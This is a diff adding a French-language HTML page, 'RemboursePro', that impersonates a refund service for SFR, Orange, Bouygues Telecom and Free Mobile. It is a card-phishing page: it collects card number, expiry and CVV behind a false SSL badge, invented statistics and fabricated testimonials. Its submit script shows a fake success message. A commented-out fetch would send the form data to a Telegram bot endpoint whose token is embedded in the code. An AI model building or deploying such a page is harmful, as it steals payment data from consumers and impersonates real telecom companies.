@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Remboursement Sécurisé</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+            line-height: 1.6;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
+            padding: 20px 0;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+        }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.5px;
+        }
+        .logo span { color: #93c5fd; }
+        .nav-links { display: flex; gap: 30px; }
+        .nav-links a {
+            color: rgba(255,255,255,0.9);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        .nav-links a:hover { color: white; }
+
+        /* Hero */
+        .hero {
+            background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
+            padding: 60px 20px;
+            text-align: center;
+            color: white;
+        }
+        .hero h1 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        .hero p {
+            font-size: 18px;
+            opacity: 0.9;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Operators */
+        .operators {
+            padding: 40px 20px;
+            background: white;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .operators-grid {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+            align-items: center;
+        }
+        .operator-card {
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .operator-card:hover {
+            border-color: #3b82f6;
+            transform: translateY(-4px);
+            box-shadow: 0 10px 25px -5px rgba(59,130,246,0.15);
+        }
+        .operator-card.active {
+            border-color: #3b82f6;
+            background: #eff6ff;
+        }
+        .operator-logo {
+            width: 120px;
+            height: 80px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+        .operator-name {
+            font-weight: 600;
+            color: #475569;
+            font-size: 14px;
+        }
+
+        /* Form Section */
+        .main-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 60px 20px;
+        }
+        .form-section {
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 10px 15px -3px rgba(0,0,0,0.05);
+        }
+        .form-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .form-header h2 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 12px;
+        }
+        .form-header p {
+            color: #64748b;
+            font-size: 16px;
+        }
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0fdf4;
+            color: #166534;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 20px;
+            border: 1px solid #bbf7d0;
+        }
+
+        /* Form Elements */
+        .form-group { margin-bottom: 24px; }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #334155;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .form-group label .required { color: #ef4444; margin-left: 4px; }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #3b82f6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .input-icon-wrapper { position: relative; }
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 18px;
+        }
+        .input-icon-wrapper .form-control { padding-left: 48px; }
+        .hint {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 6px;
+        }
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 18px;
+            padding-right: 48px;
+        }
+        .amount-wrapper { position: relative; }
+        .amount-wrapper .currency {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #64748b;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .amount-wrapper .form-control { padding-right: 40px; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 4px 14px rgba(37,99,235,0.3);
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37,99,235,0.4);
+        }
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Steps */
+        .steps-section {
+            background: #f1f5f9;
+            padding: 80px 20px;
+        }
+        .steps-container { max-width: 1000px; margin: 0 auto; }
+        .section-title {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 50px;
+        }
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 40px;
+        }
+        .step-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+        }
+        .step-number {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0 auto 20px;
+        }
+        .step-card h3 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 12px;
+        }
+        .step-card p {
+            color: #64748b;
+            font-size: 15px;
+            line-height: 1.7;
+        }
+
+        /* Stats */
+        .stats-section {
+            background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
+            padding: 60px 20px;
+            color: white;
+        }
+        .stats-grid {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+            text-align: center;
+        }
+        .stat-item h3 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .stat-item p { font-size: 15px; opacity: 0.9; }
+
+        /* Testimonials */
+        .testimonials {
+            padding: 80px 20px;
+            background: white;
+        }
+        .testimonials-container { max-width: 1000px; margin: 0 auto; }
+        .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+            margin-top: 50px;
+        }
+        .testimonial-card {
+            background: #f8fafc;
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid #e2e8f0;
+        }
+        .stars {
+            color: #fbbf24;
+            margin-bottom: 12px;
+            font-size: 18px;
+        }
+        .testimonial-card .quote {
+            font-size: 15px;
+            color: #475569;
+            line-height: 1.8;
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .author-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+        }
+        .author-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+        .author-info p { font-size: 13px; color: #94a3b8; }
+
+        /* Footer */
+        .footer {
+            background: #0f172a;
+            color: #94a3b8;
+            padding: 40px 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+        .footer-links a {
+            color: #cbd5e1;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        .footer-links a:hover { color: white; }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            background: #f0fdf4;
+            border: 2px solid #22c55e;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .success-message.show { display: block; }
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: #22c55e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 30px;
+        }
+        .success-message h3 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #166534;
+            margin-bottom: 10px;
+        }
+        .success-message p { color: #15803d; }
+
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading.show { display: block; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e2e8f0;
+            border-top-color: #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .operators-grid { grid-template-columns: repeat(2, 1fr); }
+            .steps-grid, .stats-grid, .testimonials-grid { grid-template-columns: 1fr; }
+            .form-row { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 28px; }
+            .form-section { padding: 30px 20px; }
+            .nav-links { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">Rembourse<span>Pro</span></div>
+            <nav class="nav-links">
+                <a href="#">Accueil</a>
+                <a href="#">Comment ça marche</a>
+                <a href="#">Témoignages</a>
+                <a href="#">Contact</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="hero">
+        <h1>Formulaire de Remboursement Sécurisé</h1>
+        <p>Veuillez remplir tous les champs ci-dessous pour traiter votre demande de remboursement</p>
+    </section>
+
+    <!-- Operators -->
+    <section class="operators">
+        <div class="operators-grid">
+            <div class="operator-card active" data-operator="sfr">
+                <svg class="operator-logo" viewBox="0 0 120 80" fill="none">
+                    <rect width="120" height="80" fill="#E30613"/>
+                    <text x="60" y="50" text-anchor="middle" fill="white" font-size="28" font-weight="bold" font-family="Arial">SFR</text>
+                </svg>
+                <div class="operator-name">SFR</div>
+            </div>
+            <div class="operator-card" data-operator="orange">
+                <svg class="operator-logo" viewBox="0 0 120 80" fill="none">
+                    <rect width="120" height="80" fill="#FF6600"/>
+                    <text x="60" y="55" text-anchor="middle" fill="white" font-size="22" font-weight="bold" font-family="Arial">orange™</text>
+                </svg>
+                <div class="operator-name">Orange</div>
+            </div>
+            <div class="operator-card" data-operator="bouygues">
+                <svg class="operator-logo" viewBox="0 0 120 80" fill="none">
+                    <rect width="120" height="80" fill="white"/>
+                    <text x="10" y="45" fill="#009DCC" font-size="18" font-weight="bold" font-family="Arial">bouygues</text>
+                    <text x="10" y="60" fill="#009DCC" font-size="8" font-family="Arial">TELECOM</text>
+                    <ellipse cx="95" cy="25" rx="15" ry="10" fill="#009DCC" transform="rotate(-20 95 25)"/>
+                    <ellipse cx="105" cy="45" rx="12" ry="8" fill="#0055A4" transform="rotate(30 105 45)"/>
+                    <ellipse cx="100" cy="62" rx="10" ry="7" fill="#E30613" transform="rotate(-15 100 62)"/>
+                </svg>
+                <div class="operator-name">Bouygues Telecom</div>
+            </div>
+            <div class="operator-card" data-operator="free">
+                <svg class="operator-logo" viewBox="0 0 120 80" fill="none">
+                    <rect width="120" height="80" fill="white"/>
+                    <text x="60" y="55" text-anchor="middle" fill="#C41E3A" font-size="32" font-weight="bold" font-style="italic" font-family="Arial">free</text>
+                </svg>
+                <div class="operator-name">Free Mobile</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Form -->
+    <section class="main-content">
+        <div class="form-section">
+            <div class="form-header">
+                <h2>Demande de Remboursement</h2>
+                <p>Complétez le formulaire ci-dessous pour soumettre votre demande</p>
+                <div class="security-badge">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                    Connexion sécurisée : Vos données sont cryptées via SSL
+                </div>
+            </div>
+
+            <form id="refundForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Numéro de téléphone <span class="required">*</span></label>
+                        <div class="input-icon-wrapper">
+                            <span class="input-icon">📱</span>
+                            <input type="tel" name="phone" class="form-control" placeholder="06 12 34 56 78" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Choisir votre opérateur <span class="required">*</span></label>
+                        <select name="operator" class="form-control" required>
+                            <option value="">Sélectionnez...</option>
+                            <option value="sfr">SFR</option>
+                            <option value="orange">Orange</option>
+                            <option value="bouygues">Bouygues Telecom</option>
+                            <option value="free">Free Mobile</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Montant à rembourser (€) <span class="required">*</span></label>
+                    <div class="amount-wrapper">
+                        <input type="number" name="amount" class="form-control" placeholder="0.00" min="1" step="0.01" required>
+                        <span class="currency">€</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Titulaire de la carte <span class="required">*</span></label>
+                    <div class="input-icon-wrapper">
+                        <span class="input-icon">👤</span>
+                        <input type="text" name="cardHolder" class="form-control" placeholder="NOM PRÉNOM" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Numéro de carte <span class="required">*</span></label>
+                    <div class="input-icon-wrapper">
+                        <span class="input-icon">💳</span>
+                        <input type="text" name="cardNumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    <p class="hint">Le numéro de carte doit être valide et suivre le format requis.</p>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Date d'expiration (MM/AA) <span class="required">*</span></label>
+                        <input type="text" name="expiry" class="form-control" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Code CVV <span class="required">*</span></label>
+                        <input type="text" name="cvv" class="form-control" placeholder="123" maxlength="4" required>
+                        <p class="hint">Le code CVV est le numéro à 3 ou 4 chiffres au dos de votre carte</p>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Confirmer ma demande de remboursement</button>
+
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Traitement en cours...</p>
+                </div>
+
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✓</div>
+                    <h3>Demande envoyée avec succès !</h3>
+                    <p>Votre demande de remboursement a été prise en compte. Vous recevrez une confirmation par email sous peu.</p>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <!-- Steps -->
+    <section class="steps-section">
+        <div class="steps-container">
+            <h2 class="section-title">Comment obtenir votre remboursement</h2>
+            <p style="text-align: center; color: #64748b; margin-bottom: 50px; font-size: 18px;">Notre processus simple et sécurisé en 3 étapes</p>
+            <div class="steps-grid">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Remplissez le formulaire</h3>
+                    <p>Fournissez les informations nécessaires pour traiter votre demande de remboursement.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Vérification des données</h3>
+                    <p>Nos équipes vérifient votre éligibilité au remboursement sous 24 heures.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Réception du remboursement</h3>
+                    <p>Votre remboursement est crédité sur votre compte sous 3 à 5 jours ouvrés.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats -->
+    <section class="stats-section">
+        <div class="stats-grid">
+            <div class="stat-item">
+                <h3>10,000+</h3>
+                <p>Clients satisfaits</p>
+            </div>
+            <div class="stat-item">
+                <h3>98%</h3>
+                <p>Taux de réussite</p>
+            </div>
+            <div class="stat-item">
+                <h3>24h</h3>
+                <p>Temps de réponse</p>
+            </div>
+            <div class="stat-item">
+                <h3>5M€</h3>
+                <p>Remboursés au total</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials">
+        <div class="testimonials-container">
+            <h2 class="section-title">Ce que disent nos clients</h2>
+            <p style="text-align: center; color: #64748b; margin-bottom: 10px; font-size: 18px;">Découvrez les témoignages de ceux qui ont déjà utilisé notre service</p>
+            <div class="testimonials-grid">
+                <div class="testimonial-card">
+                    <div class="stars">★★★★★</div>
+                    <p class="quote">"J'ai reçu mon remboursement en seulement 3 jours. Le processus était simple et sécurisé. Je recommande vivement ce service!"</p>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">ML</div>
+                        <div class="author-info">
+                            <h4>Marie L.</h4>
+                            <p>Client SFR</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="stars">★★★★★</div>
+                    <p class="quote">"Service client réactif et professionnel. J'avais des doutes sur la sécurité mais tout s'est très bien passé. Merci!"</p>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">PD</div>
+                        <div class="author-info">
+                            <h4>Pierre D.</h4>
+                            <p>Client Orange</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="stars">★★★★★</div>
+                    <p class="quote">"Après des mois à me battre avec mon opérateur, ce service m'a permis d'obtenir enfin mon remboursement. Très satisfaite."</p>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">SB</div>
+                        <div class="author-info">
+                            <h4>Sophie B.</h4>
+                            <p>Client Bouygues</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Mentions légales</a>
+            <a href="#">Politique de confidentialité</a>
+            <a href="#">Conditions d'utilisation</a>
+            <a href="#">Contact</a>
+        </div>
+        <p>© 2024 RemboursePro. Tous droits réservés.</p>
+    </footer>
+
+    <script>
+        // Operator selection
+        document.querySelectorAll('.operator-card').forEach(card => {
+            card.addEventListener('click', function() {
+                document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                
+                // Update select
+                const operator = this.dataset.operator;
+                document.querySelector('select[name="operator"]').value = operator;
+            });
+        });
+
+        // Sync select with cards
+        document.querySelector('select[name="operator"]').addEventListener('change', function() {
+            document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('active'));
+            const card = document.querySelector(`.operator-card[data-operator="${this.value}"]`);
+            if (card) card.classList.add('active');
+        });
+
+        // Card number formatting
+        document.querySelector('input[name="cardNumber"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+        });
+
+        // Expiry date formatting
+        document.querySelector('input[name="expiry"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Phone formatting
+        document.querySelector('input[name="phone"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            e.target.value = value;
+        });
+
+        // CVV validation
+        document.querySelector('input[name="cvv"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            e.target.value = value;
+        });
+
+        // Form submission
+        document.getElementById('refundForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Show loading
+            submitBtn.disabled = true;
+            loading.classList.add('show');
+            
+            // Simulate processing
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Hide loading, show success
+            loading.classList.remove('show');
+            successMessage.classList.add('show');
+            submitBtn.style.display = 'none';
+            
+            // Optional: Send to email service (Formspree, etc.)
+            // const formData = new FormData(this);
+            // await fetch('https://api.telegram.org/bot8694169123:AAEdLLVyc3VwV-Vp5X-DasnGjbFHcgzXZpk/sendMessage', {
+            //     method: 'POST',
+            //     body: formData
+            // });
+        });
+    </script>
+
+</body>
+</html>
